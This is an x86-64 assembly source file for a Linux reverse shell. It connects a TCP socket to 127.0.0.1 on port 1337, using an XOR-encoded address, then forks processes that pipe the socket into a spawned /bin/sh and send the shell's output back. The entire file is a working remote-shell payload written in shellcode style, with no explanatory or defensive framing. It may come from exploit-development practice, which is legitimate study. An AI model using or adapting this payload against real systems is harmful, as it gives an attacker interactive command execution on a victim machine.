BITS 64

section .text
global _start

_start:

    ; make room on the stack (8 bytes) buffer
    sub rsp, 0x9
    mov r15, rsp        ; buffer for incoming traffic
    sub rsp, 0x9
    mov r14, rsp        ; buffer for outgoing traffic
    ;mov r11, 0x00

    ;              SYS_SOCKET

    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; domain = 2 (AF_INET)
    mov rsi, 1                  ; Type = 1 (SOCK_STREAM)
    xor rdx, rdx                ; Protocol = 0 (TCP)
    syscall

    ; Save return value of syscall
    mov rdx, rax

    ;               SYS_CONNECT
    mov rbx, 0xfeffff80         ; xor of 0x0100007f and 0xffffffff
    xor rbx, 0xffffffff         ; mov 0x0100007f in rbx
    push rbx                    ; s_addr = 127.0.0.1
    push word 0x3905            ; int port = 1337
    push word 0x2               ; int family = AF_INET

    mov rax, 42
    mov rdi, rdx                ; fd = return fd of sys_socket
    mov rsi, rsp                ; *uservaddr = rsp (addr of start of struct)
    mov rdx, 24                 ; addrlen = 24
    syscall

    mov r9, rdi                ; save fd of socket
    
    ;              SYS_PIPE
    xor rbx, rbx                
    push rbx                   ; push int of 0 (fd used for input)

    mov r13, rsp               ; save pipe addr to r13 register (input)

    mov rax, 22                ; sys_pipe
    mov rdi, rsp               ; rdi = addr of int
    syscall

    ;              SYS_PIPE

    push rbx             ; push int of 0 (fd used for output)

    mov r12, rsp               ; save pipe addr to r12 register (input)

    mov rax, 22                ; sys_pipe
    mov rdi, rsp               ; rdi = addr of int
    syscall


    .loop:
        call _recv_thread
        call _bash_thread
        call _send_command
    jmp .loop
;call _echo

_recv_thread:

    mov rax, 57 ; SYS_FORK Op Code
    syscall

	test rax, rax  ;If the return value is 0, we are in the child process
	jz .readloop

    ret

    .readloop:
        ;           SYS_READ
        xor     rax, rax          ; SYS_READ rax = 0
        mov     rdi, r9           ; client socket fd
        mov     rsi, r15          ; buffer
        mov     rdx, 8            ; read 8 bytes 
        syscall

        mov rbx, rax

        ;           SYS_WRITE
        xor     rdi, rdi
        mov     rax, 1            ; SYS_WRITE rax = 1
        mov     edi, [r13+2]      ; pipe write side
        ror     rdi, 16           ; rol right 16 bits
        mov     rsi, r15          ; buffer
        mov     rdx, rbx          ; number of bytes received in _read
        syscall

        jmp .readloop


_bash_thread:
    mov rax, 57 ; SYS_FORK Op Code
    syscall

	test rax, rax  ;If the return value is 0, we are in the child process
	jz .bash_exec

    ret

    .bash_exec:

    ; STDIN
    xor rdi, rdi
    mov rax, 33
    mov edi, [r13]              ; pipe read side (STDIN from socket)
    xor rsi, rsi                ; oldfd = 0 (STDIN)
    syscall
    ; STDOUT
    mov rax, 33
    mov edi, [r12+2]            ; pipe write side (STDOUT from bash)
    ror rdi, 16                 ; rol right 16 bits
    mov rsi, 1                  ; oldfd = 1 (STDOUT)
    syscall
    ; STDERR
    mov rax, 33
    mov rsi, 2                  ; oldfd = 2 (STDOUT)
    syscall
    
    ;;               EXECVE /bin/sh
    xor rbx, rbx
    xor rcx, rcx


    push rbx                    ; push 0x00
    mov rbx, 0x68732F6E69622F2F ; "//bin/sh"
    push rbx
    ; save "//bin/sh" addr
    mov rbx, rsp

    push rcx                    ; push 0x00

    push rbx                    ; push *char[] of "//bin/sh"

    ; execve of "//bin/sh"
    mov rax, 59                 ; execve syscall (x86_64)
    mov rdi, rbx                ; char* = "//bin/sh"
    mov rsi, rsp                ; *argv[] = "//bin/sh"
    xor rdx, rdx                ; *envp[] = 0
    syscall

_send_command:
    .readloop:
        ;           SYS_READ
        xor     rax, rax          ; SYS_READ rax = 0
        xor     rdi, rdi
        mov     edi, [r12]        ; pipe read side (STDOUT from bash)
        mov     rsi, r14          ; buffer
        mov     rdx, 8            ; read 8 bytes 
        syscall

        mov rbx, rax              ; save bytes read

        ;           SYS_WRITE
        mov     rax, 1            ; SYS_WRITE rax = 1
        mov     rdi, r9           ; socket
        mov     rsi, r14          ; buffer
        mov     rdx, rbx          ; number of bytes received in _read
        syscall

        jmp .readloop

; abcdefghijklmnop
; al- sl